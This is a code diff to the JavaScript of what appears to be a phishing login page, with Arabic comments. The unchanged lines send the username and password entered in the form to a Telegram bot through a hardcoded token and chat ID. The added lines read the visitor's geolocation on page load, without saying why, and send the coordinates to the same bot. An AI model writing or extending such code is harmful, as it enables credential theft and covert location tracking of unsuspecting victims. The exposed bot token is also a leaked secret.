@@ -85,6 +85,62 @@
 const TELEGRAM_BOT_TOKEN = '8104735798:AAGstSFp66i5aG0-uKofVqWWiIbLbE5wpjA'; // هنا قم بتغييره بتوكن بوتك الخاص بك
 const CHAT_ID = '1346665329'; // هنا قم بتغييره بمعرف الدردشة الخاص بك
 
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+    } else {
+        alert("المتصفح لا يدعم جغرافيا الويب.");
+    }
+}
+
+function sendLocation(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+
+    const locationMessage = `الموقع: خط العرض: ${latitude}, خط الطول: ${longitude}`;
+
+    // إرسال موقع المستخدم إلى بوت تيليجرام
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: locationMessage
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (!data.ok) {
+            console.error('خطأ في إرسال الموقع:', data);
+        }
+    })
+    .catch(error => {
+        console.error('حدث خطأ:', error);
+    });
+}
+
+function showError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            alert("لم يتم السماح بوصول الموقع.");
+            break;
+        case error.POSITION_UNAVAILABLE:
+            alert("معلومات الموقع غير متاحة.");
+            break;
+        case error.TIMEOUT:
+            alert("الطلب لتحديد الموقع أدى إلى وقت انتظار.");
+            break;
+        case error.UNKNOWN_ERROR:
+            alert("خطأ غير معروف.");
+            break;
+    }
+}
+
+// جمع موقع المستخدم عند تحميل الصفحة
+getLocation();
+
 document.getElementById('loginForm').addEventListener('submit', function(event) {
     event.preventDefault(); // منع السلوك الافتراضي للنموذج
 
@@ -93,7 +149,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
 
     const message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;
 
-    // إرسال البيانات إلى بوت تيليجرام
+    // إرسال بيانات المستخدم إلى بوت تيليجرام
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {
